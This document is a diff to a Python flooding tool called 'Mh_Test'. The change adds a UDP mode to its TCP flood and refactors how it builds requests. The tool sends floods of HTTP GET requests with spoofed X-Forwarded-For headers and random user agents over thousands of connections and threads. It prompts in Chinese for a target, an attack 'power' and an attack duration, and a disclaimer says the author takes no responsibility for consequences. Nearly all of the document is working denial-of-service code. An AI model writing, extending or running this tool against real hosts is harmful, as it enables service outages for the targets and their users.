@@ -2,7 +2,7 @@ import socket,sys,time,os
 import threading as th
 from random import choice,randint
 from tqdm import tqdm
-version,m1='b0.0.2a','(c)Copyrighgt 2025 _MhwsChina_'
+version,m1='b0.0.2b','(c)Copyrighgt 2025 _MhwsChina_'
 useragents=[
     'Java/21.0.3',
     'Python-urllib/2.5',
@@ -59,31 +59,34 @@ def print(*args,end=''):
     for i in txt:
         if ord(i)<=255:l+=1
         else:l+=2
-    txt=txt+(os.get_terminal_size().columns-l)*' '
+    try:txt=txt+(os.get_terminal_size().columns-l)*' '
+    except:txt+='\n'
     sys.stdout.write(txt+end)
 def log(txt,mode='INFO',end='',start=''):
     t=time.strftime('%H:%M:%S',time.localtime(time.time()))
     print(f'{start}[{t} {mode}]: {txt}',end=end)
-class mht_default(th.Thread):
+def getreq():
+    useragent='User-Agent: '+choice(useragents)+'\r\n'
+    accept=choice(accepts)
+    ipr=f'{randint(0,255)}.{randint(0,255)}.{randint(0,255)}.{randint(0,255)}'
+    forward='X-Forwarded-For: '+ipr+'\r\n'
+    connection='Connection: Keep-Alive\r\n'
+    get_host='GET'+' '+page+' HTTP/1.1\r\nHost: '+ip+'\r\n'
+    req=get_host+useragent+accept+forward+connection+'\r\n'
+    req=bytes(req,encoding='gbk')
+    return req
+class mht_TCPdefault(th.Thread):
     def __init__(self):
         th.Thread.__init__(self)
     def run(self):
         global clients,cindex,qs,qe
         c=th.current_thread().name
-        useragent='User-Agent: '+choice(useragents)+'\r\n'
-        accept=choice(accepts)
-        ipr=f'{randint(0,255)}.{randint(0,255)}.{randint(0,255)}.{randint(0,255)}'
-        forward='X-Forwarded-For: '+ipr+'\r\n'
-        connection='Connection: Keep-Alive\r\n'
-        get_host='GET'+' '+page+' HTTP/1.1\r\nHost: '+ip+'\r\n'
-        req=get_host+useragent+accept+forward+connection+'\r\n'
-        req=bytes(req,encoding='gbk')
+        req=getreq()
         while 1:
             lock.acquire()
-            if cindex>=cn:cindex=0
+            if cindex>=len(clients):cindex=0
             tmpa=cindex
-            try:client=clients[tmpa]
-            except:pass
+            client=clients[tmpa]
             cindex+=1
             lock.release()
             try:
@@ -92,15 +95,31 @@ class mht_default(th.Thread):
                     qs+=1
             except Exception as ad:
                 qe+=1
-                if debug:log(f'[-] @ {c} '+str(ad),mode='ERROR',start='\r',end='')
-                while 1:
-                    try:
-                        clients.append(create_client())
-                        break
-                    except:pass
-                try:del clients[tmpa]
-                except:pass
-def create_client():
+                if debug:log(f'[-] @ {c} '+str(ad),mode='ERROR')
+                clients[tmpa]=create_tcp_client()
+class mht_UDPdefault(th.Thread):
+    def __init__(self):
+        th.Thread.__init__(self)
+    def run(self):
+        global clients,cindex,qs,qe
+        c=th.current_thread().name
+        req=getreq()
+        while 1:
+            lock.acquire()
+            if cindex>=len(clients):cindex=0
+            tmpa=cindex
+            client=clients[tmpa]
+            cindex+=1
+            lock.release()
+            try:
+                for tmp in range(cnt):
+                    client.sendto(req,(ip,port))
+                    qs+=1
+            except Exception as ad:
+                qe+=1
+                if debug:log(f'[-] @ {c} '+str(ad),mode='ERROR')
+                clients[tmpa]=create_udp_client()
+def create_tcp_client():
     ip1=ip.split('/')[0]
     while 1:
         try:
@@ -110,14 +129,21 @@ def create_client():
             temp_client.connect((ip1,port))
             return temp_client
         except:pass
+def create_udp_client():
+    while 1:
+        try:
+            temp_client=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            temp_client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            return temp_client
+        except:pass
 def sclient():
-    global cntmp,cntmp1
-    while cntmp:
-        try:cntmp.pop(0)
+    global cns
+    while cns:
+        try:cns.pop(0)
         except:return
-        clients.append(create_client())
+        if udp:clients.append(create_udp_client())
+        else:clients.append(create_tcp_client())
         cbar.update(1)
-        cntmp1+=1
 log(' * Mh_Test '+version)
 log(' * Code:   https://github.com/MhwsChina/Mh_Test')
 log(' * Auther: _MhwsChina_')
@@ -126,31 +152,41 @@ log(' * Text:   使用该工具产生的后果作者概不负责',mode='WARN')
 ip=getln('IP/网址:').replace('http://','').replace('https://','')
 page=ip.split('/')
 page='/' if len(page)==1 else '/'+'/'.join(page[1:])
-port=getln('PORT/端口:',int,80)
+ip=ip.split('/')[0]
+if ':' in ip:
+    ip,port=ip.split(':')
+    port=int(port)
+else:
+    port=getln('PORT/端口:',int,80)
 cn=getln('CONNECT/连接数(10000):',int,10000)
-thread=getln('THREAD/发包线程(800):',int,800)
+thread=getln('THREAD/发包线程(1000):',int,1000)
 cnt=getln('威力[(10=普通)(50=高)(100=极高)]:',int,100)
 tm=getln('TIME/攻击持续时间:',int,60)
+udp=1 if getln('是否使用UDP连接(Y/[n])',str,'n',['Y','y','N','n']).lower()=='y' else 0
 log('创建连接')
-cntmp=list(range(cn))
-cntmp1=0
 cbar=tqdm(total=cn,ascii=True,dynamic_ncols=True)
 if thread>cn:thread=cn
+cns=list(range(cn))
+t=[]
 for i in range(thread):
-    try:tth=th.Thread(target=sclient,name='create').start()
+    try:
+        t1=th.Thread(target=sclient,name='create')
+        t1.start()
+        t.append(t1)
     except:pass
-while cntmp1<cn:
-    time.sleep(1)
+for t1 in t:t1.join()
 cbar.close()
 log(f'创建了{len(clients)}条连接')
 lock.acquire()
 log('启动线程')
 for i in range(thread):
     try:
-        mht_default().start()
+        if udp:mht_UDPdefault().start()
+        else:mht_TCPdefault().start()
     except:pass
 log('加载完毕')
-debug=1 if getln('DEBUG MODE?(Y/n)',str,'n',['Y','n'])=='Y' else 0
+debug=1 if getln('DEBUG MODE?(Y/[n])',str,'n',['Y','n'])=='Y' else 0
+log(f'TARGET={ip}:{port},MODE={"udp" if udp else "tcp"}')
 input('按下Enter开始压测')
 lock.release()
 qss=0
